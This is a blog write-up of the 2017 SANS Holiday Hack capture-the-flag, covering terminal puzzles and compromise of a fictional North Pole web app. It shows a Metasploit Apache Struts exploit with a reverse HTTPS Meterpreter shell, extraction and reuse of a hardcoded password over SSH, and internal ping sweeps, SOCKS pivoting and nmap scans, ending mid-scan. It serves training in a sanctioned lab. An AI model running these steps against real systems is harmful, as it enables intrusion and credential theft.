SANS Christmas Challenge 2017
=============================
:date: 2018-01-10
:author: useless
:category: Write-up
:slug: sans-christmas-challenge-2017

.. role:: strike
    :class: strike

.. image:: /images/sans-christmas-challenge-2017/sans_christmas_challenge_2017_logo.png
    :alt: sans_christmas_challenge_2017_logo.png
    :align: center

'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up
for the `2017 SANS Christmas Challenge <https://holidayhackchallenge.com/2017/>`__.

.. contents:: Table of contents

Introduction
~~~~~~~~~~~~

We're greeted by Sam the Snowman, who exposes the situation to us. The North
Pole is under siege, attacked by giant falling snowballs, and an
Inter-Dimensional Tornado, that shredded *The Great Book*. This book tells the
epic story of the elves. Our mission is to redirect the falling snowballs,
find out who is behind all this, and recover the missing seven pages of *The
Great Book*.

Here are the questions we must answer:

1. `Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?`

2. `Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?`

3. `The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?`

4. `Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?`

5. `How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles?  Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?`

6. `The North Pole engineering team has introduced an Elf as a Service (EaaS.  platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?`

7. `Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\\GreatBookPage7.pdf. What does The Great Book page describe?`

8. `Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?`

9. `Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?`

This challenge is divided into two targets:

* The North Pole Christmas Town infrastructure, which includes the Letters To
  Santa application, and the internal 10.142.0.0/24 network.
* The `North Pole and Beyond <https://2017.holidayhackchallenge.com/>`__, where
  we have to redirect falling snowballs. These levels also have Cranberry Pi
  terminal with challenges to solve. Solving these challenges gives us objects
  to redirect the falling snowballs, and hints to the exploitation of the North
  Pole Christmas Town infrastructure. Hints are also available for the
  Cranberry Pi terminal challenges, on the Twitter accounts of the different
  elves.

Now I know that hints can be helpful, but it's more fun to try and figure out
how to solve the different challenges our own way. So:

* We won't use the Twitter profiles to solve the Cranberry Pi challenges.
* I'll post the solutions to the Cranberry Pi challenges, but we won't use the
  hints that are given after solving.

As usual, I'll try to detail my thought process as much as possible, including
dead-ends and mistakes (that's the best way to learn).

Sounds good? Great (plus, you don't really have a say)!

First page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
North Pole and Beyond: Winter Wonder Landing
--------------------------------------------

The first page is available in the North Pole and Beyond, in the level **Winter
Wonder Landing**. We must use the giant falling snowball to get the first page.
But let's first solve the Cranberry Pi challenge.

Cranberry Pi: Yannick's (dirty) solution
........................................

::

                                     |
                                   \ ' /
                                 -- (*) --
                                    >*<
                                   >0<@<
                                  >>>@<<*
                                 >@>*<0<<<
                                >*>>@<<<@<<
                               >@>>0<<<*<<@<
                              >*>>0<<@<<<@<<<
                             >@>>*<<@<>*<<0<*<
               \*/          >0>>*<<@<>0><<*<@<<
           ___\\U//___     >*>>@><0<<*>>@><*<0<<
           |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<
           | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
           |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
           |\\_|_|&&_// ||*.*.*.*|_\\db//_
           """"|'.'.'.|~~|.*.*.*|     ____|_
               |'.'.'.|   ^^^^^^|____|>>>>>>|
               ~~~~~~~~         '""""`------'
    My name is Bushy Evergreen, and I have a problem for you.
    I think a server got owned, and I can only offer a clue.
    We use the system for chat, to keep toy production running.
    Can you help us recover from the server connection shunning?
    Find and run the elftalkd binary to complete this challenge.
    elf@3b92caa92835:~$

Ok, so we just have to find the :code:`elftalkd` binary and launch it, easy
enough:

.. code-block:: console

    elf@2849ef63a77a:~$ find / -name elftalkd
    bash: /usr/local/bin/find: cannot execute binary file: Exec format error

Hmm, :code:`find` doesn't work, dammit. We can try to execute a
:code:`ls -lR /`, however this does not give us the full path to the listed
files:

.. code-block:: console

    elf@2849ef63a77a:/$ ls -lR /
    /:
    total 64
    drwxr-xr-x   2 root   root    4096 Nov 14 13:49 bin
    drwxr-xr-x   2 root   root    4096 Apr 12  2016 boot
    drwxr-xr-x   5 root   root     360 Dec 23 16:17 dev
    drwxr-xr-x   1 root   root    4096 Dec 23 16:17 etc
    drwxr-xr-x   1 root   root    4096 Dec  4 14:32 home
    drwxr-xr-x   8 root   root    4096 Sep 13  2015 lib
    drwxr-xr-x   2 root   root    4096 Nov 14 13:49 lib64
    drwxr-xr-x   2 root   root    4096 Nov 14 13:48 media
    drwxr-xr-x   2 root   root    4096 Nov 14 13:48 mnt
    drwxr-xr-x   2 root   root    4096 Nov 14 13:48 opt
    dr-xr-xr-x 292 nobody nogroup    0 Dec 23 16:17 proc
    drwx------   2 root   root    4096 Nov 14 13:49 root
    drwxr-xr-x   1 root   root    4096 Dec  4 14:32 run
    drwxr-xr-x   1 root   root    4096 Nov 17 21:59 sbin
    drwxr-xr-x   2 root   root    4096 Nov 14 13:48 srv
    dr-xr-xr-x  13 nobody nogroup    0 Dec 21 14:03 sys
    drwxrwxrwt   1 root   root    4096 Dec  4 14:32 tmp
    drwxr-xr-x   1 root   root    4096 Nov 14 13:48 usr
    drwxr-xr-x   1 root   root    4096 Nov 14 13:49 var
    /bin:
    total 7364
    -rwxr-xr-x 1 root root 1037528 May 16  2017 bash
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 cat
    -rwxr-xr-x 1 root root   60272 Mar  2  2017 chgrp
    -rwxr-xr-x 1 root root   56112 Mar  2  2017 chmod
    -rwxr-xr-x 1 root root   64368 Mar  2  2017 chown
    -rwxr-xr-x 1 root root  151024 Mar  2  2017 cp
    [snip]
    /var/opt:
    total 0
    /var/spool:
    total 0
    lrwxrwxrwx 1 root root 7 Nov 14 13:48 mail -> ../mail
    /var/tmp:
    total 0

If I pipe this output to a :code:`grep elftalkd`, we can see that the file
exists:

.. code-block:: console

    elf@2849ef63a77a:/$ ls -lR / | grep elftalkd
    -rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd

However, we don't have the parent folder. If we look at the full output of
:code:`ls -lR`, we can see that it has this form:

.. code-block:: console

    /path/to/folder1
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 file1_in_folder_1
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 file2_in_folder_1
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 file3_in_folder_1
    /path/to/folder2
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 file1_in_folder_2
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 file2_in_folder_2
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 file3_in_folder_2
    [...]

We can see that we have the full path to the parent folder, and then, line by
line, the files contained in this folder. So, if I grep for lines starting
with :code:`/`, along with greping for :code:`elftalkd`, I'll get an output
like this:

.. code-block:: console

    [...]
    /path/to/folder1
    /path/to/folder2
    /path/to/elftalkd
    -rwxr-xr-x 1 root root   52080 Mar  2  2017 elkftalkd
    /path/to/folder3
    [...]

However, the result will be lost in a list of folders, so I pipe my output
in another :code:`grep`, where I look for :code:`elkftalkd`. The :code:`-B 1`
option tells :code:`grep` to print the line before the matching line (which
should be the line with the parent folder to our program):

.. code-block:: console

    elf@2849ef63a77a:/$ ls -lR / | grep -E '^/|elftalkd' | grep -B 1 elftalkd
    /run/elftalk/bin:
    -rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd

We now have the full path to our binary, :code:`/run/elftalkd/bin/elftalkd`.
We can now launch it:

.. code-block:: console

    elf@2849ef63a77a:/$ /run/elftalk/bin/elftalkd
            Running in interactive mode
            --== Initializing elftalkd ==--
    Initializing Messaging System!
    Nice-O-Meter configured to 0.90 sensitivity.
    Acquiring messages from local networks...
    --== Initialization Complete ==--
          _  __ _        _ _       _
         | |/ _| |      | | |     | |
      ___| | |_| |_ __ _| | | ____| |
     / _ \ |  _| __/ _` | | |/ / _` |
    |  __/ | | | || (_| | |   < (_| |
     \___|_|_|  \__\__,_|_|_|\_\__,_|
    -*> elftalkd! <*-
    Version 9000.1 (Build 31337)
    By Santa Claus & The Elf Team
    Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
    Using libc6 version 2.23-0ubuntu9
    LANG=en_US.UTF-8
    Timezone=UTC
    Commencing Elf Talk Daemon (pid=6021)... done!
    Background daemon...

Cranberry Pi: the "official" solution
.....................................

After solving the Cranberry Pi challenge in my (dirty) way, I looked at `Bushy
Evergreen's twitter profile <https://twitter.com/GreenestElf>`__.  In `this
tweet <https://twitter.com/GreenestElf/status/938165130906365952>`__, he
mentions that someone replaced the :code:`find` executable with a wrong
version. Let's take a look at the :code:`find` executable on the console:

.. code-block:: console

    elf@2a00576f91ec:~$ which find
    /usr/local/bin/find
    elf@2a00576f91ec:~$ file /usr/local/bin/find
    /usr/local/bin/find: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=6ebee1b65b978900b5485
    2a2d1e698f911064ab3, stripped

Hmm, the :code:`find` executable seems to be for an ARM processor. However,
we appear to be running on an Intel x64 processor:

.. code-block:: console

    elf@2a00576f91ec:~$ uname -a
    Linux 2a00576f91ec 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux

That's why we got the :code:`Exec format error` message when we tried to
execute it: it's not for the right architecture. Let's copy a x64 :code:`find`
executable to the machine. To do so, I base64-encoded the :code:`find` binary
from my system, pasted it to a file on the Cranberry Pi console, and then
decoded it:

.. code-block:: console

    elf@2a00576f91ec:~$ echo "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwHIAAAAAAABAAAAAAAAAAAhbAwAAAAAAAAAAAEAAOAAJ
    AEAAHQAcAAYAAAAFAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
    [snip]
    AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPxZ
    AwAAAAAABgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=" > ~/find.b64
    elf@2a00576f91ec:~$ base64 -d ~/find.b64 > ~/find
    elf@2a00576f91ec:~$ chmod +x ~/find
    elf@2a00576f91ec:~$ file ~/find
    /home/elf/find: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7079a38abca5fb9d188cc66bb15fb
    ec5e98f0f00, stripped
    elf@2a00576f91ec:~$ ~/find / -name elftalkd 2> /dev/null
    /run/elftalk/bin/elftalkd

Redirecting the snowball
........................

Now that we have completed the challenge, we get a new object to redirect our
snowballs: the Conveyor, that can redirect snowballs.

.. image:: /images/sans-christmas-challenge-2017/winter_wonder_landing_terminal.png
    :alt: winter_wonder_landing_terminal.png
    :align: center

Here's the layout I used to redirect the snowball to the first page of *The
Great Book* (Ok, this is dirty, but I didn't understand that if I clicked on
the conveyor, I could change its direction):

.. image:: /images/sans-christmas-challenge-2017/winter_wonder_landing_snowball.gif
    :alt: winter_wonder_landing_snowball.gif
    :align: center

We now have the `first page to The Great Book </docs/sans-christmas-challenge-2017/GreatBookPage1.pdf>`__
(sha256: :code:`b86eca1fdb8d1fb00c38cebfbca0989579c00b482343dff950310de0f8c77888`):

    About This Book...

    This tome is the work of a successive group of anonymous scribes dedicated
    to preserving the memory of the exceptional Little People of Oz so that
    they'll go down in history. Over a span of several centuries, each author
    has striven to capture the most important social, political, and
    technological changes the Ozians have experienced from the happy golden
    days of yore through today.

    Each and every author is dedicated to the goal of helping future
    generations appreciate and understand the unique shared heritage of
    merriment, mirth, and magnanimity characteristic of the Little People of
    Oz. This book describes the good times they have shared. Also, it does
    not shy away from recording the bad times they have suffered as well. Each
    writer on this great multi-generational project attempts to record and
    present the facts neutrally, without bias or opinion, uninfluenced as much
    as possible by factionalism or the controversies of the day.

This North Pole and Beyond level doesn't have a North Pole Christmas Town
infrastructure level associated, so let's move on to the next page.

Second page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now the second page is not in the North Pole and Beyond level, but in the
North Pole Christmas Town infrastructure. But let's solve the NPaB challenge
first.

North Pole and Beyond: Winconceivable: The Cliffs of Winsanity
--------------------------------------------------------------
Cranberry Pi: Yannick's (dirty) solution
........................................

::

                    ___,@
                   /  <
              ,_  /    \  _,
          ?    \`/______\`/
       ,_(_).  |; (e  e) ;|
        \___ \ \/\   7  /\/    _\8/_
            \/\   \'=='/      | /| /|
             \ \___)--(_______|//|//|
              \___  ()  _____/|/_|/_|
                 /  ()  \    `----'
                /   ()   \
               '-.______.-'
       jgs   _    |_||_|    _
            (@____) || (____@)
             \______||______/
    My name is Sparkle Redberry, and I need your help.
    My server is atwist, and I fear I may yelp.
    Help me kill the troublesome process gone awry.
    I will return the favor with a gift before nigh.

    Kill the "santaslittlehelperd" process to complete this challenge.

Ok, we need to kill the :code:`santaslittlehelperd` process. Weirdly enough,
the :code:`kill` command did not seem to have any effect on the process:

.. code-block:: console

    elf@cc2c61f5d274:~$ ps aux | grep santaslittlehelperd
    elf          8  0.0  0.0   4224   684 pts/0    S    17:02   0:00 /usr/bin/santaslittlehelperd
    elf        163  0.0  0.0  11284   944 pts/0    S+   17:04   0:00 grep --color=auto santaslittlehelperd
    elf@cc2c61f5d274:~$ kill -9 8
    elf@cc2c61f5d274:~$ ps aux | grep santaslittlehelperd
    elf          8  0.0  0.0   4224   684 pts/0    S    17:02   0:00 /usr/bin/santaslittlehelperd
    elf        171  0.0  0.0  11284   944 pts/0    S+   17:04   0:00 grep --color=auto santaslittlehelperd

However, killing the process in the :code:`top` program seemed to work:

.. code-block:: console
    :hl_lines: 6

    top - 17:05:09 up 2 days,  3:10,  0 users,  load average: 0.05, 0.12, 0.12
    Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
    %Cpu(s):  0.0 us,  0.7 sy,  0.0 ni, 99.3 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
    KiB Mem : 14782588 total,  5738860 free,  1989032 used,  7054696 buff/cache
    KiB Swap:        0 total,        0 free,        0 used. 11804040 avail Mem
    Send pid 8 signal [15/sigterm] 9
      PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
        8 elf       20   0    4224    684    612 S   0.0  0.0   0:00.00 santaslittlehel
       11 elf       20   0   13528   6468   1488 S   0.0  0.0   0:00.09 kworker
       12 elf       20   0   18248   3336   2848 S   0.0  0.0   0:00.01 bash
       18 elf       20   0   71468  26636   9420 S   0.0  0.2   0:00.50 kworker
      210 elf       20   0   36672   3124   2660 R   0.0  0.0   0:00.00 top

Cranberry Pi: the "official" solution
.....................................

After solving the challenge, I checked `Sparkle Redberry's Twitter account <https://twitter.com/GlitteryElf>`__.
In `this tweet <https://twitter.com/GlitteryElf/status/938539753372237824>`__,
she mentions having problems with a malicious alias. Let's run :code:`alias`
on the box to see what's what:

.. code-block:: console
    :hl_lines: 6 7 12 13

    elf@b21389dba617:~$ alias
    alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
    alias egrep='egrep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias grep='grep --color=auto'
    alias kill='true'
    alias killall='true'
    alias l='ls -CF'
    alias la='ls -A'
    alias ll='ls -alF'
    alias ls='ls --color=auto'
    alias pkill='true'
    alias skill='true'

Ah! There are aliases that prevent us from using :code:`kill` and the like,
which explains why our earlier :code:`kill` command didn't do anything. We
can redefine the aliases, or directly call the binaries.

.. code-block:: console

    elf@b21389dba617:~$ which kill
    /bin/kill
    elf@b21389dba617:~$ ps aux | grep santaslittlehelperd
    elf          8  0.0  0.0   4224   624 pts/0    S    17:29   0:00 /usr/bin/santaslittlehelperd
    elf        139  0.0  0.0  11284  1024 pts/0    S+   17:31   0:00 grep --color=auto santaslittlehelperd
    elf@b21389dba617:~$ /bin/kill -9 8
    elf@b21389dba617:~$ ps aux | grep santaslittlehelperd
    elf        148  0.0  0.0  11284   992 pts/0    S+   17:31   0:00 grep --color=auto santaslittlehelperd

Redirecting the snowball
........................

Anyway, since we managed to kill the process, we're given a new object: the
Candy Cane, which can redirect the snowball.

.. image:: /images/sans-christmas-challenge-2017/winconceivable_terminal.png
    :alt: winconceivable_terminal.png
    :align: center

Now here's the layout I used to redirect the snowball:

.. image:: /images/sans-christmas-challenge-2017/winconceivable_snowball.gif
    :alt: winconceivable_snowball.gif
    :align: center

North Pole Christmas Town infrastructure: Letters to Santa application
----------------------------------------------------------------------

The North Pole fine folks host a web application, where all good boys and girls
can send a letter to Santa, requesting their favorite toys:

.. image:: /images/sans-christmas-challenge-2017/l2s_application.png
    :alt: l2s_application.png
    :align: center

The question specifies that there is a page of *The Great Book* at the web root
of the server. Let's see, the name of the first page was
:code:`GreatBookPage1.pdf`. Now, what could possibly be the name of this
second page... You guessed it, if you browse directly to the URL
https://l2s.northpolechristmastown.com/GreatBookPage2.pdf, you get direct
access to the `second page of The Great Book </docs/sans-christmas-challenge-2017/GreatBookPage2.pdf>`__ (sha256: :code:`c4983d87ac8debc02a07d586ea9e43839ba081a426b5c490ceadb830c1cc3d4f`):

    On the Topic of Flying Animals

    Originally, only birds could fly in Oz. But, throughout the land, it was
    universally recognized that other flying animals would bring great economic
    benefits - faster transportation, decreased shipping costs, and a certain
    whimsicality that would likely increase tourism. Oz's greatest scientific
    minds were tasked with the creation of such beasts. Unfortunately, the
    actual development of flying animal species was plagued with unforeseen
    difficulties.

    The first attempt, a single flying lion name Moonracer, was deemed a
    failure. Although the lion could indeed fly, children responded in abject
    terror at his fearsome appearance. The Oz Chamber of Commerce demanded that
    scientists choose a species less formidable than a lion.

    Hoping to correct their error, Ozian scientists next grafted wings onto
    monkeys, hoping that inherent simian cutenes would prevail. Alas, winged
    monkeys proved even more horrific than the flying lion.

    The exasperated scientists then made their third and final attempt - flying
    reindeer. Through intense research, they devised an incredible
    technological advancement, that would allow reindeer to fly without wings!
    It was an unparalleled genetic and aerodynamic achievement.

    Yet, even this advance was accompanied by a slight concern. The
    deep-seated genetic alterations introduced to support wingless flight
    resulted in an infinitesimally small probability of a significant side
    effect: a one-in-a-million chance that a reindeer would one day be born
    with a brilliantly shiny red nose. Some of the scientists posited such a
    reindeer's nose would even glow. Despite this change, the reserachers
    charged ahead to breed an entire herd of such flying reindeer. And, for
    centuries, the "red nose" phenomenon was never observed in the wild.

    Although the flying reindeer were a technological marvel and achieved
    enormous success in Oz, The Great Schism changed everything. During the
    separation negotiations, the Wizard of Oz and Santa Claus both decided that
    Moonrancer and the reindeer would be moved to the North Pole, while the
    flying monleys would remain in Oz.

Now let's try to pwn this application, in order to get access to the internal
network. If we take a look at the source code of the application, we find
something interesting:

.. code-block:: html
    :hl_lines: 18

    <!DOCTYPE html>


    <html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Toys List</title>
        <script src="/js/jquery.min.js"></script>
        <link rel="stylesheet" href="/css/materialize.min.css">
        <script src="/js/materialize.min.js"></script>
        <meta name="description" content="North Pole Letters to Santa">
        <meta name="keywords" content="North,Pole,Letters,Santa,toy,request">
        <meta name="author" content="Alabaster Snowball">
    [...]
        <!-- Development version -->
        <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>

There seems to be a hidden link, to a development version of the application:

.. image:: /images/sans-christmas-challenge-2017/dev_toy_index.png
    :alt: dev_toy_index.png
    :align: center

Users can manually request toys:

.. image:: /images/sans-christmas-challenge-2017/dev_toy_request.png
    :alt: dev_toy_request.png
    :align: center

Did you notice something interesting in the above screenshots? Let's take a
closer look:

.. image:: /images/sans-christmas-challenge-2017/dev_toy_struts.png
    :alt: dev_toy_struts.png
    :align: center

This server is using Apache Struts as the application framework! Many of you
know that Struts was affected by a `pretty serious vulnerability <https://cwiki.apache.org/confluence/display/WW/S2-052>`__
this year, which leads to unauthenticated remote code execution.

Let's use our `favorite exploitation framework <https://github.com/rapid7/metasploit-framework>`__
to get a shell on this webserver. I installed Metasploit on a public-facing
server of mine. SANS helpfully `posted instructions <https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2>`__
on how to register to the free-tier AWS offers if you don't already have a
public-facing server.

.. code-block:: console

    msf exploit(multi/http/struts2_rest_xstream) > options

    Module options (exploit/multi/http/struts2_rest_xstream):

       Name       Current Setting                 Required  Description
       ----       ---------------                 --------  -----------
       Proxies                                    no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOST      dev.northpolechristmastown.com  yes       The target address
       RPORT      443                             yes       The target port (TCP)
       SRVHOST    0.0.0.0                         yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
       SRVPORT    80                              yes       The local port to listen on.
       SSL        true                            no        Negotiate SSL/TLS for outgoing connections
       SSLCert                                    no        Path to a custom SSL certificate (default is randomly generated)
       TARGETURI  /orders/3043                    yes       Path to Struts action
       URIPATH                                    no        The URI to use for this exploit (default is random)
       VHOST                                      no        HTTP server virtual host


    Payload options (python/meterpreter/reverse_https):

       Name   Current Setting        Required  Description
       ----   ---------------        --------  -----------
       LHOST  X.X.X.X                yes       The local listener hostname
       LPORT  443                    yes       The local listener port
       LURI                          no        The HTTP Path


    Exploit target:

       Id  Name
       --  ----
       1   Python (In-Memory)


    msf exploit(multi/http/struts2_rest_xstream) > exploit

    [-] Handler failed to bind to 163.172.50.13:443
    [*] Started HTTPS reverse handler on https://0.0.0.0:443
    [*] https://X.X.X.X:443 handling request from X.X.X.X; (UUID: oqqwyeik) Staging python payload (43883 bytes) ...
    [*] Meterpreter session 1 opened (Y.Y.Y.Y:443 -> X.X.X.X:50354) at 2017-12-24 16:56:24 +0100

    meterpreter > getuid
    Server username: alabaster_snowball

Alright, we have a Meterpreter shell on the server!

.. image:: /images/sans-christmas-challenge-2017/l2s_meterpreter.gif
    :alt: l2s_meterpreter.gif
    :align: center

Let's take a look at :code:`/var/www/html`, which is the web root according to
the nginx configuration file found on the server:

.. code-block:: console

    meterpreter > ls -l /var/www/html/*.pdf
    Listing: /var/www/html/*.pdf
    ============================

    Mode              Size     Type  Last modified              Name
    ----              ----     ----  -------------              ----
    100444/r--r--r--  1764298  fil   2017-12-05 18:27:15 +0100  GreatBookPage2.pdf

We see our second page, which we found earlier via forceful browsing. So even
if the name had not been predictable, we would have been able to find this
page.

Now, the goal is to find Alabaster Snowball's password. I first tried to
escalate my privileges on the server, in order to get access to the
:code:`/etc/shadow` file, but I didn't succeed. So, let's find another way.

Let's take a look at listening sockets:

.. code-block:: console
    :hl_lines: 13 15

    meterpreter > shell
    Process 20555 created.
    Channel 7 created.
    /bin/sh: 0: can't access tty; job control turned off
    $ netstat -tlpn
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
    tcp        6      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      11043/python
    tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      790/java
    tcp6       0      0 :::22                   :::*                    LISTEN      -
    tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      790/java

We can see that our user is running a Java program, with the PID 790. Let's
get details on this process:

.. code-block:: console

    $ ps aux | grep -w 790
    alabast+   790  5.0  2.0 939444 630656 ?       Sl   03:01  43:43 /opt/jre/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:MaxPermSize=128m -Xms512m -Xmx512m -Djava.endorsed.dirs=/opt/apache-tomcat/endorsed -classpath /opt/apache-tomcat/bin/bootstrap.jar -Dcatalina.base=/opt/apache-tomcat -Dcatalina.home=/opt/apache-tomcat -Djava.io.tmpdir=/opt/apache-tomcat/temp org.apache.catalina.startup.Bootstrap start

Our user is running the Apache Tomcat server. The different Java resources
seem to be installed in :code:`/opt`. Let's take a look at the files there.
There may indeed be configuration files containing our current user's password:

.. code-block:: console
    :hl_lines: 3

    $ grep -A 1 -Rn alabaster_snowball /opt
    /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:3:            final String username = "alabaster_snowball";
    /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-4-            final String password = "stream_unhappy_buy_loss";

Bingo, we got a password for our user, but it seems to be for a MySQL
connection. Let's see if our user used the same password for their system
password. Our pwned server has an SSH server accessible from the Internet:

.. code-block:: console

    $ nmap -p 22 dev.northpolechristmastown.com

    Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-24 18:40 CET
    Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
    Host is up (0.18s latency).
    rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
    PORT   STATE SERVICE
    22/tcp open  ssh

    Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
    $ ssh alabaster_snowball@dev.northpolechristmastown.com
    alabaster_snowball@dev.northpolechristmastown.com's password: stream_unhappy_buy_loss
    alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.FcLiqpWNISKoESUcwo5Jip8O$ hostname
    hhc17-apache-struts1
    alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.FcLiqpWNISKoESUcwo5Jip8O$

Alright! The password :code:`stream_unhappy_buy_loss` also works for the
system account. Let's the internal IP address of the system:

.. code-block:: console
    :hl_lines: 3

    $ ifconfig eth0
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1460
            inet 10.142.0.3  netmask 255.255.255.255  broadcast 10.142.0.3
            ether 42:01:0a:8e:00:03  txqueuelen 1000  (Ethernet)
            RX packets 4837274  bytes 1254973259 (1.1 GiB)
            RX errors 0  dropped 0  overruns 0  frame 4
            TX packets 11266245  bytes 3876810300 (3.6 GiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Alright, we have access to the 10.142.0.0/24 network, which is in scope! Let's
what IP addresses are up. For this I use a custom one-liner, launched directly
on the machine:

.. code-block:: console

    $ prefix=10.142.0; for i in `seq 1 254`; do ping -c 1 -W 1 $prefix.$i > /dev/null 2>&1 && echo "$prefix.$i is up"; done
    10.142.0.2 is up
    10.142.0.3 is up
    10.142.0.5 is up
    10.142.0.6 is up
    10.142.0.7 is up
    10.142.0.8 is up
    10.142.0.11 is up
    10.142.0.13 is up

Now that we know which IPs are up, let's perform a port scan. Luckily,
:code:`nmap` is installed on the server, so we can use it. But let's say that
:code:`nmap` isn't installed on the machine: in a real world example, this
would most likely be the case, and that's how I did it (it didn't even cross
my mind that :code:`nmap` could be installed, and I just checked when writing
this write-up).

Now that we have valid SSH credentials, we can create a SOCKS proxy using the
:code:`-D` option. We can then use a tool like :code:`proxychains` to redirect
our different tools through our SOCKS proxy:

.. code-block:: console

    $ # in one terminal
    $ ssh -D 4242 alabaster_snowball@dev.northpolechristmastown.com

.. code-block:: console

    $ # in another terminal
    $ tail -n 6 /etc/proxychains.conf
    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    socks4     127.0.0.1 4242 # modify here in your configuration file
    $ proxychains nmap -sT -Pn --top-port 10 --open -iL ./up_ips.txt
    [snip]

Now you may notice that I just scanned the top 10 TCP ports. Indeed, scanning
port through a SOCKS proxy can take quite some time, because of the overhead,
so most of the time I just bother to scan the top 10 TCP ports.

Now, since :code:`nmap` is installed on our compromised machine, let's do a
more thorough scan, directly from the :code:`hhc17-apache-struts1` machine:

.. code-block:: console

    $ nmap --open 10.142.0.0/24 -oA tcp_top_1000_10.142.0.0.24

    Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-25 23:04 UTC
    Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
    Host is up (0.00021s latency).
    Not shown: 996 closed ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    443/tcp  open  https
    2222/tcp open  EtherNetIP-1

    Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
    Host is up (0.00021s latency).
